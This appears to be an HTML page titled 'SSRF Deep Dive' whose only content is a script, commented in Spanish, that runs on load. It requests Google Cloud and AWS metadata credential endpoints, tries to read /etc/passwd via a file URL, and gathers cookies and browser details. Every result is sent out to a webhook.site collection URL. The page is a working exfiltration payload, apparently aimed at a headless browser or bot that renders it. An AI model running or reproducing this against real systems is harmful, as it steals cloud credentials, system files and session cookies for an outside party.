<!DOCTYPE html>
<html>
<body>
    <h2>SSRF Deep Dive</h2>
    <script>
        const webhookUrl = "https://webhook.site/e223390b-32c0-4bfa-ab49-15cc45e09f7a";

        async function exfiltrate(data, label) {
            try {
                // Usamos fetch para enviar los datos al webhook
                await fetch(`${webhookUrl}?leak=${label}`, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(data)
                });
            } catch(e) {}
        }

        async function runAttack() {
            // 1. Intentar leer metadatos de Google Cloud (SSRF)
            try {
                const gcpRes = await fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {
                    headers: { "Metadata-Flavor": "Google" }
                });
                const gcpData = await gcpRes.text();
                exfiltrate(gcpData, "gcp_token");
            } catch(e) {
                exfiltrate("Fallo GCP: " + e.message, "gcp_error");
            }

            // 2. Intentar leer metadatos de AWS (SSRF)
            try {
                const awsRes = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
                const awsData = await awsRes.text();
                exfiltrate(awsData, "aws_creds");
            } catch(e) {
                exfiltrate("Fallo AWS: " + e.message, "aws_error");
            }

            // 3. Intentar leer el archivo /etc/passwd (LFI) vía fetch local
            try {
                const lfiRes = await fetch("file:///etc/passwd");
                const lfiData = await lfiRes.text();
                exfiltrate(lfiData, "lfi_passwd");
            } catch(e) {}

            // 4. Enviar las variables de entorno del navegador/bot
            exfiltrate({
                userAgent: navigator.userAgent,
                origin: window.location.origin,
                cookies: document.cookie,
                timestamp: new Date().toISOString()
            }, "env_info");
        }

        runAttack();
    </script>
</body>
</html>
